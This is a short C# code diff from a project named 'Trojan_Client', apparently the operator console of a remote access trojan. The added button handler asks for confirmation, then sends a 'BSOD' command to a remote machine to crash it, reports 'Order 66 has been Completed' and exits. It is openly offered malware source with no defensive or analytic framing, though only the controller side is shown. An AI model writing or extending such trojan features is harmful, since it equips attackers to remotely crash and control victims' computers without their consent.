@@ -165,6 +165,22 @@ namespace Trojan_Client__Schöner_
                 MessageBox.Show("Canceld", "Error");
             }
 		}
+
+        private void button14_Click(object sender, EventArgs e)
+        {
+            DialogResult result = MessageBox.Show("Warning! This will cause a BSOD on the Remote System. Continue?", "Warning", MessageBoxButtons.YesNo);
+            if (result == DialogResult.Yes)
+            {
+                SendCommand("BSOD!!!!---");
+                MessageBox.Show("Order 66 has been Completed and The System should BSOD Soon!");
+                Writer.Close();
+                Application.Exit();
+            }
+            else
+            {
+                MessageBox.Show("Canceld!");
+            }
+        }
     }
 
     }
